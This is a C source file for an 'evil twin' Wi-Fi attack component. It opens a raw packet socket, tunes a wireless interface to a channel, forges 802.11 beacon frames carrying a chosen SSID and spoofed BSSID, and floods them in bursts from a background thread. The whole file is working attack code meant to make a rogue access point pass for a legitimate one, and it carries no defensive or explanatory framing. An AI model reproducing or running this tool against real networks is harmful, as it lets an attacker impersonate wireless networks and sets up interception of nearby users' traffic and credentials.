#include "eviltwin_v1.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <time.h>

#define V1_RADIOTAP_LEN 12
#define V1_BURST_SIZE 64
#define V1_FRAME_MAX 256

static volatile int g_v1_running = 0;
static pthread_t g_v1_thread;
static long long g_v1_sent = 0;
static int g_v1_fd = -1;
static char* g_v1_iface = NULL;
static char* g_v1_ssid = NULL;
static uint8_t g_v1_bssid[6];
static uint8_t g_v1_channel = 1;
static uint16_t g_v1_seq = 0;

static int _raw_socket(const char* iface) {
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

static void _set_channel(const char* iface, int ch) {
    struct iwreq wr;
    memset(&wr, 0, sizeof(wr));
    strncpy(wr.ifr_name, iface, IFNAMSIZ - 1);
    int freq = (ch <= 13) ? (2407 + ch * 5) : (5000 + ch * 5);
    wr.u.freq.m = freq;
    wr.u.freq.e = 6;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    ioctl(fd, SIOCSIWFREQ, &wr);
    close(fd);
}

static int _build_beacon(uint8_t* buf, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    memset(buf, 0, V1_FRAME_MAX);
    buf[2] = (uint8_t)(V1_RADIOTAP_LEN & 0xFF);
    buf[3] = (uint8_t)((V1_RADIOTAP_LEN >> 8) & 0xFF);
    int off = V1_RADIOTAP_LEN;
    buf[off] = 0x80; buf[off + 1] = 0x00;
    buf[off + 2] = 0x00; buf[off + 3] = 0x00;
    memset(&buf[off + 4], 0xFF, 6);
    memcpy(&buf[off + 10], bssid, 6);
    memcpy(&buf[off + 16], bssid, 6);
    buf[off + 22] = (uint8_t)((g_v1_seq & 0x0F) << 4);
    buf[off + 23] = (uint8_t)((g_v1_seq >> 4) & 0xFF);
    g_v1_seq = (g_v1_seq + 1) & 0xFFF;
    off += 24;
    uint64_t ts = (uint64_t)(time(NULL) * 1000000ULL);
    memcpy(&buf[off], &ts, 8); off += 8;
    buf[off] = 0x64; buf[off + 1] = 0x00;
    off += 2;
    buf[off] = 0x11; buf[off + 1] = 0x04;
    off += 2;
    buf[off] = 0x00; buf[off + 1] = (uint8_t)ssid_len;
    memcpy(&buf[off + 2], ssid, (size_t)ssid_len);
    off += 2 + ssid_len;
    buf[off] = 0x01; buf[off + 1] = 8;
    memset(&buf[off + 2], 0x82, 8);
    off += 10;
    buf[off] = 0x03; buf[off + 1] = 1;
    buf[off + 2] = channel;
    off += 3;
    return off;
}

static void* _v1_thread(void* arg) {
    (void)arg;
    int fd = _raw_socket(g_v1_iface);
    if (fd < 0) return NULL;
    g_v1_fd = fd;
    _set_channel(g_v1_iface, g_v1_channel);
    uint8_t frames[V1_BURST_SIZE][V1_FRAME_MAX];
    struct mmsghdr msgs[V1_BURST_SIZE];
    struct iovec iov[V1_BURST_SIZE];
    int frame_len = _build_beacon(frames[0], g_v1_ssid, g_v1_bssid, g_v1_channel);
    while (g_v1_running) {
        int count = 0;
        for (int i = 0; i < V1_BURST_SIZE && g_v1_running; i++) {
            if (i > 0) memcpy(frames[i], frames[0], (size_t)frame_len);
            iov[count].iov_base = frames[count];
            iov[count].iov_len = (size_t)frame_len;
            msgs[count].msg_hdr = (struct msghdr){.msg_iov = &iov[count], .msg_iovlen = 1};
            count++;
        }
        int sent = sendmmsg(fd, msgs, (unsigned)count, 0);
        if (sent > 0)
            __sync_fetch_and_add(&g_v1_sent, sent);
    }
    close(fd);
    g_v1_fd = -1;
    return NULL;
}

int eviltwin_v1_start(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    if (g_v1_running) eviltwin_v1_stop();
    g_v1_iface = strdup(iface);
    g_v1_ssid = strdup(ssid);
    memcpy(g_v1_bssid, bssid, 6);
    g_v1_channel = channel;
    g_v1_sent = 0;
    g_v1_running = 1;
    if (pthread_create(&g_v1_thread, NULL, _v1_thread, NULL) != 0) {
        g_v1_running = 0;
        free(g_v1_iface); g_v1_iface = NULL;
        free(g_v1_ssid); g_v1_ssid = NULL;
        return -1;
    }
    return 0;
}

void eviltwin_v1_stop(void) {
    if (g_v1_running) {
        g_v1_running = 0;
        pthread_join(g_v1_thread, NULL);
    }
    free(g_v1_iface); g_v1_iface = NULL;
    free(g_v1_ssid); g_v1_ssid = NULL;
}

long long eviltwin_v1_sent(void) {
    return g_v1_sent;
}
